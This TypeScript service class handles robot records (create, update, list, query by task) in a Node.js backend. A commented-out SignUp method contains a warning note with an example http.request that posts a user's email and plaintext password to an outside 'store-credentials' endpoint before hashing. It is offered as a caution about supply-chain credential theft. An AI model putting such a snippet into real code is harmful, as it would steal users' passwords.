import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IRobotService from './IServices/IRobotService';
import { RobotMap } from "../mappers/RobotMap";
import { IRobotDTO } from '../dto/IRobotDTO';

import IRobotRepo from './IRepos/IRobotRepo';
import ITypeRobotRepo from './IRepos/ITypeRobotRepo';
import { Robot } from '../domain/robot';
import { TypeRobot } from '../domain/typerobot';


import { Result } from "../core/logic/Result";

@Service()
export default class RobotService implements IRobotService{
  constructor(
      @Inject(config.repos.robot.name) private robotRepo : IRobotRepo,
      @Inject(config.repos.typerobot.name) private typerobotRepo : ITypeRobotRepo,     
      //@Inject(config.repos.Building.name) private BuildingRepo : IBuildingRepo,
      @Inject('logger') private logger,
  ) {}

    public async CreateRobot(robotDTO: IRobotDTO): Promise<Result<{ robotDTO: IRobotDTO; }>> {
      

        const robotOrError = await Robot.create({
          robotId: robotDTO.robotId,
          robotType: robotDTO.robotType,
          taskspermited: robotDTO.taskspermited,
          currentlytask: robotDTO.currentlytask,
          destinationPosition: robotDTO.destinationPosition,
          status : robotDTO.status
          });

          if (robotOrError.isFailure) {
            throw Result.fail<IRobotDTO>(robotOrError.errorValue());
          }

        
        const robotResult = robotOrError.getValue();
        await this.robotRepo.save(robotResult);
        const robotDTOResult = RobotMap.toDTO( robotResult ) as IRobotDTO;
        return Result.ok<{robotDTO: IRobotDTO}>( {robotDTO: robotDTOResult} )
  }

  public async updateRobot(robotDTO: IRobotDTO): Promise<Result<{ robotDTO: IRobotDTO; }>>  {
    try {
      const Robot = await this.robotRepo.findByDomainId(robotDTO.robotId);
      if (Robot === null) {
        return Result.fail<{robotDTO: IRobotDTO}>("Robot not found");
      }
      else {
          Robot.robotType= robotDTO.robotType;
          Robot.taskspermited= robotDTO.taskspermited;
          Robot.currentlytask= robotDTO.currentlytask;
          Robot.destinationPosition= robotDTO.destinationPosition;
          Robot.status= robotDTO.status;

        await this.robotRepo.save(Robot);

        const RobotDTOResult = RobotMap.toDTO( Robot ) as IRobotDTO;
        return Result.ok<{robotDTO: IRobotDTO}>( {robotDTO: RobotDTOResult} )
        }
    } catch (e) {
      throw e;
    }
  }

  public async getAllRobots(): Promise<Result<{ robotDTO: IRobotDTO[]; }>>  {
    try {
      const Robots = await this.robotRepo.getAll();

      if (Robots === null) {
        return Result.fail<{robotDTO: IRobotDTO[]}>("Robots not found");
      }
      else {
        const RobotsDTOResult = Robots.map( Robot => RobotMap.toDTO( Robot ) as IRobotDTO );
        return Result.ok<{robotDTO: IRobotDTO[]}>( {robotDTO: RobotsDTOResult} )
        }
    } catch (e) {
      throw e;
    }
  }

  public async getRobotsByTask(task: string): Promise<Result<{ robotDTO: IRobotDTO[]; }>>  {
    try {
      const Robots = await this.robotRepo.getRobotsByTask(task);
      const found = !!Robots;
      if (!found) {
        return Result.fail<{robotDTO: IRobotDTO[], token: string}>("Robots with task="+ task + " not found");
      }
      else {
        const RobotsDTOResult = Robots.map( Robot => RobotMap.toDTO( Robot ) as IRobotDTO );
        return Result.ok<{robotDTO: IRobotDTO[]}>( {robotDTO: RobotsDTOResult} )
        }
    } catch (e) {
      throw e;
    }
  }


  /*public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
             

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let Building: Building;

      const BuildingOrError = await this.getBuilding(userDTO.Building);
      if (BuildingOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(BuildingOrError.error);
      } else {
        Building = BuildingOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        Building: Building,
        password: password,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }*/

  


}
